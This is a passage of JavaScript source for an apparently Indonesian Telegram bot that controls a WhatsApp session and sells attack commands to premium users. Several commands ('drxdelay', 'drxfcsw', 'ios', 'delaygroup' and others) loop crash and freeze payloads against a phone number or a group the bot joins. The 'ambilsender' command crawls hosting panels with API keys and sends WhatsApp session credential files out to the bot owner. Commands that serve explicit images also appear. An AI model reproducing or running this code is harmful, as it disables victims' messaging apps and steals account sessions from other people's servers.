        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|xavionerAmpazz",
      { parse_mode: "HTML" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "HTML" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Senn Offc ( 🕷️ )`,
      parse_mode: "HTML"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});

// ===== COMMAND RESTART OWNER =====
bot.command("restart", async (ctx) => {

  if (ctx.from.id !== OWNER_ID) {
    return ctx.reply("❌ Command ini hanya untuk owner.");
  }

  await ctx.reply("♻️ Bot sedang direstart...");

  setTimeout(() => {
    process.exit(0);
  }, 1000);

});
//CASE BUG GB 
bot.command("delaygroup", checkWhatsAppConnection, checkPremium, async (ctx) => {
     const chatId = ctx.chat.id;

  const username = ctx.from.username
    ? `@${ctx.from.username}`
    : ctx.from.first_name || "User";
    
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`🪧 ☇ Format: /delaygroup https://chat.whatsapp.com/xxxx `);
  }

  let groupLink = q;
  let groupId = groupLink.includes("https://chat.whatsapp.com/")
    ? groupLink.split("https://chat.whatsapp.com/")[1]
    : groupLink;

  if (!groupId) {
    return ctx.reply("Tautan atau ID grup tidak valid.");
  }

  const displayUrl = groupLink.includes("http") ? groupLink : `https://chat.whatsapp.com/${groupId}`;

  await ctx.telegram.sendPhoto(ctx.chat.id, bugurlpp, {
       caption: `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : CRASH CLICK GROUP

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : https://chat.whatsapp.com/${groupId}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : SUCCESS SEND
</blockquote>
    `.trim(),
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://chat.whatsapp.com/${groupId}`, style: "success", icon_custom_emoji_id: "6206024028126189839" }]
      ]
    }
  });
  
    try {
      let target = groupId;

      if (groupLink.includes("https://chat.whatsapp.com/")) {
        const joined = await sock.groupAcceptInvite(groupId);
        target = joined;
      }

      for (let i = 0; i < 50; i++) {
        await DelayOneHitPermaByMia(sock, target);
        await sleep(4000);
      }

    } catch (err) {
      console.log(`Bot error:`, err.message);
    }
});

//========CASE BUG ANDROID======//
bot.command("drxdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /drxdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, bugurlpp, {
    caption: `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : INVISIBLE DELAY HARD

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : CHAT BUG PROCESS
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6206024028126189839" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await maklodelay(sock, target);
    await DelayNewByMia(sock, target);
    await sleep(5);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : INVISIBLE DELAY HARD

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : SUCCESS SEND
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6206024028126189839" }
      ]]
    }
  });
});

bot.command("drxfcsw", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /drxfcsw 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, bugurlpp, {
    caption: `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : FORCECLOSE TAG SW

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : CHAT BUG PROCESS
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6206024028126189839" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await forceclosesw(sock, target);
    await forceclosesw(sock, target);
    await sleep(10);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : FORCECLOSE TAG SW

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : SUCCESS SEND
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6206024028126189839" }
      ]]
    }
  });
});

bot.command("drxfcvis", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /drxfcvis 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, bugurlpp, {
    caption: `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : FORCECLOSE VISIBLE BUG 

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : CHAT BUG PROCESS
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6206024028126189839" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await Fcinvisv1(sock, target);
    await Fcinvisv1(sock, target);
    await sleep(10);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : FORCECLOSE VISIBLE BUG 

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : SUCCESS SEND
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6206024028126189839" }
      ]]
    }
  });
});

bot.command("drxblank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /drxfc 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, bugurlpp, {
    caption: `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : BLANK CLICK 

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : CHAT BUG PROCESS
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6206024028126189839" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await NanasBlankOLD(sock, target);
    await NanasBlankOLD(sock, target);
    await NanasBlankOLD(sock, target);
    await sleep(5);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : BLANK CLICK

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : SUCCESS SEND
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6206024028126189839" }
      ]]
    }
  });
});

//========CASE BUG IOS======//
bot.command("ios", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ios 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, bugurlpp, {
    caption: `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : INVISIBLE DELAY HARD IPHONE 

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : CHAT BUG PROCESS
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await delayHardSpam(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : INVISIBLE DELAY HARD IPHONE 

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : SUCCESS SEND
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6206024028126189839" }
      ]]
    }
  });
});

bot.command("fcios", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /fcios 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, bugurlpp, {
    caption: `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : INVISIBLE FORCECLOSE IPHONE 

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : CHAT BUG PROCESS
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await delayHardSpam(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote><tg-emoji emoji-id="5350421136368755377">💤</tg-emoji> MODE : INVISIBLE FORCECLOSE IPHONE 

<tg-emoji emoji-id="6001298824209896162">🤍</tg-emoji> User   : @${ctx.from.username}
<tg-emoji emoji-id="5350460637182993292">🎯</tg-emoji> Target : ${q}
Type   : Status
<tg-emoji emoji-id="5778313992036423586">📱</tg-emoji> Result : SUCCESS SEND
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6206024028126189839" }
      ]]
    }
  });
});


//==CASE BUG/TOOLS BUG/TOOLS GROUP==//
bot.command("broadcast", async (ctx) => {
    if (ctx.from.id.toString() !== developerID.toString()) {
        return ctx.reply("❌ ☇ Akses hanya untuk developer");
    }

    const reply = ctx.message.reply_to_message;
    if (!reply) {
        return ctx.reply("🪧 ☇ Reply pesan lalu ketik /broadcast\n\n");
    }

    try {
        const targets = Array.isArray(ownerID) ? ownerID : [ownerID];
        let success = 0, failed = 0;

        const header = "📢 BROADCAST DEVELOPER<br/>"; // <br/> untuk HTML newline
        // Atau bisa pakai: "📢 BROADCAST DEVELOPER\n\n" tapi untuk HTML lebih aman pakai <br/>

        for (const id of targets) {
            try {
                // ----- TEXT -----
                if (reply.text) {
                    // Gabungkan header + teks reply (yang mungkin sudah berisi HTML)
                    let text = reply.text;
                    // Hati-hati: jika reply.text mengandung HTML, header harus valid.
                    // Lebih aman kirim header terpisah, atau header dalam <b> dll.
                    // Saran: gunakan header dengan tag HTML sederhana
                    const finalText = `<b><tg-emoji emoji-id="5915814406490427591">🔔</tg-emoji> BROADCAST DEVELOPER</b>\n\n${text}`;
                    
                    await bot.telegram.sendMessage(id, finalText, {
                        parse_mode: "HTML"
                    });
                }

                // ----- PHOTO -----
                else if (reply.photo) {
                    const photo = reply.photo[reply.photo.length - 1].file_id;
                    const caption = reply.caption || "";
                    const finalCaption = `<b><tg-emoji emoji-id="5915814406490427591">🔔</tg-emoji> BROADCAST DEVELOPER</b>\n\n${caption}`;
                    await bot.telegram.sendPhoto(id, photo, {
                        caption: finalCaption,
                        parse_mode: "HTML"
                    });
                }

                // ----- VIDEO -----
                else if (reply.video) {
                    const caption = reply.caption || "";
                    const finalCaption = `<b><tg-emoji emoji-id="5915814406490427591">🔔</tg-emoji> BROADCAST DEVELOPER</b>\n\n${caption}`;
                    await bot.telegram.sendVideo(id, reply.video.file_id, {
                        caption: finalCaption,
                        parse_mode: "HTML"
                    });
                }

                // ----- DOCUMENT -----
                else if (reply.document) {
                    const caption = reply.caption || "";
                    const finalCaption = `<b><tg-emoji emoji-id="5915814406490427591">🔔</tg-emoji> BROADCAST DEVELOPER</b>\n\n${caption}`;
                    await bot.telegram.sendDocument(id, reply.document.file_id, {
                        caption: finalCaption,
                        parse_mode: "HTML"
                    });
                }

                success++;
                await sleep(1000);
            } catch (e) {
                failed++;
                console.error(e);
            }
        }

        ctx.reply(`✅ ☇ Broadcast selesai\n✔ Berhasil: ${success}\n✖ Gagal: ${failed}`);
    } catch (err) {
        console.error(err);
        ctx.reply("❌ ☇ Gagal broadcast");
    }
});

bot.command("ambilsender", checkOwner, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /ambilsender https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /ambilsender https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "HTML" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "sension, sensions") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "sension, sensions") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
            { parse_mode: "HTML" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

const listHentai = [
  {"url": "https://files.catbox.moe/5wt81f.jpg"},
  {"url": "https://files.catbox.moe/xdqj22.jpg"},
  {"url": "https://files.catbox.moe/lvafhj.jpg"},
  {"url": "https://files.catbox.moe/em6j1f.jpg"},
  {"url": "https://files.catbox.moe/5bgyld.jpg"},
  {"url": "https://files.catbox.moe/orafro.jpg"},
  {"url": "https://files.catbox.moe/lcm9x3.jpg"},
  {"url": "https://files.catbox.moe/x3ux77.jpg"},
  {"url": "https://files.catbox.moe/f5ucmj.jpg"},
  {"url": "https://files.catbox.moe/djq46h.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/w0225y.jpg"},
  {"url": "https://files.catbox.moe/fqm5fg.jpg"},
  {"url": "https://files.catbox.moe/itv3b0.jpg"},
  {"url": "https://files.catbox.moe/s45bdq.jpg"},
  {"url": "https://files.catbox.moe/omhwvo.jpg"},
  {"url": "https://files.catbox.moe/8eaqrj.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/e99emf.jpg"}
]

bot.command('hentai', checkPremium, async (ctx) => {
  const loadingMsg = await ctx.reply('🔄 Loading hentai...');
  
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  const pick = getRandom();
  
  try {
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim hentai. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

bot.action('hentai_next', async (ctx) => {
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  
  try {
    await ctx.answerCbQuery();
    
    const loadingMsg = await ctx.reply('🔄 Loading hentai berikutnya...');
    await ctx.deleteMessage();
    
    const pick = getRandom();
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai selanjutnya untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading hentai', { show_alert: true });
  }
});
const videoList = [
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/r3ip1j.mp4"},
  {"url": "https://files.catbox.moe/71l6bo.mp4"},
  {"url": "https://files.catbox.moe/rdggsh.mp4"},
  {"url": "https://files.catbox.moe/3288uf.mp4"},
  {"url": "https://files.catbox.moe/jdopgq.mp4"},
  {"url": "https://files.catbox.moe/8ca9cw.mp4"},
  {"url": "https://files.catbox.moe/b99qh3.mp4"},
  {"url": "https://files.catbox.moe/6bkokw.mp4"},
  {"url": "https://files.catbox.moe/ebisdh.mp4"},
  {"url": "https://files.catbox.moe/3yko44.mp4"},
  {"url": "https://files.catbox.moe/apqlvo.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/n37liq.mp4"},
  {"url": "https://files.catbox.moe/0728bg.mp4"},
  {"url": "https://files.catbox.moe/p69jdc.mp4"},
  {"url": "https://files.catbox.moe/occ3en.mp4"},
  {"url": "https://files.catbox.moe/y8hmau.mp4"},
  {"url": "https://files.catbox.moe/tvj95b.mp4"},
  {"url": "https://files.catbox.moe/3g2djb.mp4"},
  {"url": "https://files.catbox.moe/xlbafn.mp4"}
  // ... tambahkan yang lain
]

bot.command('asupan', checkPremium, async (ctx) => {
  // Kirim pesan loading
  const loadingMsg = await ctx.reply('🔄 Loading video... Tunggu sebentar!');
  
  const getRandomVideo = () => videoList[Math.floor(Math.random() * videoList.length)];
  const pick = getRandomVideo();
  
  try {
    // Gunakan approach direct URL tanpa download
